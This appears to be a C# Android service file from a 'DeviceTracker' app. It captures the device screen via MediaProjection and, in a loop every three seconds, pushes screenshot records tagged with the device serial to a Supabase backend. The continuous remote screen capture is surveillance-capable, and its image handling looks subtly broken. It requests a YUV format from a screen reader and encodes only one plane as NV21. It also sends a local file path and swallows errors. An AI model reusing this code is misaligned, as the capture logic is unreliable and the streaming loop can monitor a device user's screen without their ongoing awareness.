using Android.App;
using Android.Content;
using Android.Graphics;
using Android.Hardware.Display;
using Android.Media;
using Android.Media.Projection;
using Android.OS;
using Android.Views;

namespace DeviceTracker.Services.Media;

public class ScreenCaptureService : Service
{
    private const int NotificationId = 1002;
    private const string ChannelId = "screen_capture_channel";

    private MediaProjection? _mediaProjection;
    private VirtualDisplay? _virtualDisplay;
    private ImageReader? _imageReader;
    private Handler? _handler;
    private CancellationTokenSource? _streamCts;

    private static ScreenCaptureService? _instance;
    public static ScreenCaptureService? Instance => _instance;
    public static Intent? ProjectionData { get; set; }

    public override IBinder? OnBind(Intent? intent) => null;

    public override void OnCreate()
    {
        base.OnCreate();
        _instance = this;
    }

    public override StartCommandResult OnStartCommand(Intent? intent, StartCommandFlags flags, int startId)
    {
        CreateNotificationChannel();
        var notification = new Notification.Builder(this, ChannelId)
            .SetContentTitle("Screen Capture")
            .SetContentText("Ready")
            .SetSmallIcon(global::Android.Resource.Drawable.IcMenuCamera)
            .SetOngoing(true)
            .Build();
        StartForeground(NotificationId, notification);
        return StartCommandResult.Sticky;
    }

    public async Task<string?> CaptureScreenshotAsync()
    {
        try
        {
            var projection = GetMediaProjection();
            if (projection == null) return null;

            var metrics = Resources!.DisplayMetrics!;
            var width = metrics.WidthPixels;
            var height = metrics.HeightPixels;
            var density = metrics.DensityDpi;

            _imageReader = ImageReader.NewInstance(width, height, Android.Graphics.ImageFormatType.Yuv420888, 2);
            _handler = new Handler(Looper.MainLooper!);

            _virtualDisplay = projection.CreateVirtualDisplay(
                "ScreenCapture",
                width, height, (int)density,
                0,
                _imageReader.Surface, null, _handler!);

            var image = await Task.Run(() =>
            {
                var img = _imageReader.AcquireLatestImage();
                if (img == null)
                {
                    Thread.Sleep(500);
                    img = _imageReader.AcquireLatestImage();
                }
                return img;
            });

            if (image == null) { Cleanup(); return null; }

            var planes = image.GetPlanes();
            if (planes.Length == 0) { image.Close(); Cleanup(); return null; }

            var buffer = planes[0].Buffer;
            var pixelStride = planes[0].PixelStride;
            var rowStride = planes[0].RowStride;

            var yuv = new byte[buffer.Remaining()];
            buffer.Get(yuv);

            var yuvImage = new YuvImage(yuv, Android.Graphics.ImageFormatType.Nv21, width, height, null);
            var dir = new Java.IO.File(CacheDir, "screenshots");
            if (!dir.Exists()) dir.Mkdirs();
            var file = new Java.IO.File(dir, $"screen_{DateTime.UtcNow:yyyyMMdd_HHmmss}.jpg");

            using var fileStream = System.IO.File.Open(file.AbsolutePath, System.IO.FileMode.Create);
            yuvImage.CompressToJpeg(new Android.Graphics.Rect(0, 0, width, height), 85, fileStream);
            fileStream.Close();
            image.Close();
            Cleanup();

            return file.AbsolutePath;
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[ScreenCapture] Error: {ex.Message}");
            Cleanup();
            return null;
        }
    }

    public async Task StartStreamingAsync(int intervalMs = 3000, CancellationToken ct = default)
    {
        _streamCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
        while (!_streamCts.Token.IsCancellationRequested)
        {
            try
            {
                var path = await CaptureScreenshotAsync();
                if (path != null)
                {
                    var supabase = IPlatformApplication.Current?.Services
                        ?.GetService<Services.SupabaseService>();
                    if (supabase != null)
                    {
                        var record = new Models.MediaCaptureRecord
                        {
                            DeviceSerial = Preferences.Get("device_serial", "UNKNOWN"),
                            MediaType = "screenshot",
                            FilePath = path,
                            MimeType = "image/jpeg",
                            CapturedAt = DateTime.UtcNow
                        };
                        await supabase.PushMediaCaptureAsync(record);
                    }
                }
            }
            catch { }
            await Task.Delay(intervalMs, _streamCts.Token);
        }
    }

    public void StopStreaming()
    {
        _streamCts?.Cancel();
    }

    private MediaProjection? GetMediaProjection()
    {
        if (_mediaProjection != null) return _mediaProjection;

        var data = ProjectionData;
        if (data == null) return null;

        var mgr = GetSystemService(MediaProjectionService) as MediaProjectionManager;
        if (mgr == null) return null;

        _mediaProjection = mgr.GetMediaProjection((int)Android.App.Result.Ok, data);
        return _mediaProjection;
    }

    private void Cleanup()
    {
        _virtualDisplay?.Release();
        _virtualDisplay = null;
        _imageReader?.Close();
        _imageReader = null;
    }

    private void CreateNotificationChannel()
    {
        if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
        {
            var channel = new NotificationChannel(ChannelId, "Screen Capture", NotificationImportance.Low)
            {
                Description = "Screen capture service",
                LockscreenVisibility = NotificationVisibility.Private
            };
            var mgr = GetSystemService(NotificationService) as NotificationManager;
            mgr?.CreateNotificationChannel(channel);
        }
    }

    public override void OnDestroy()
    {
        StopStreaming();
        _mediaProjection?.Stop();
        _mediaProjection = null;
        _instance = null;
        base.OnDestroy();
    }
}
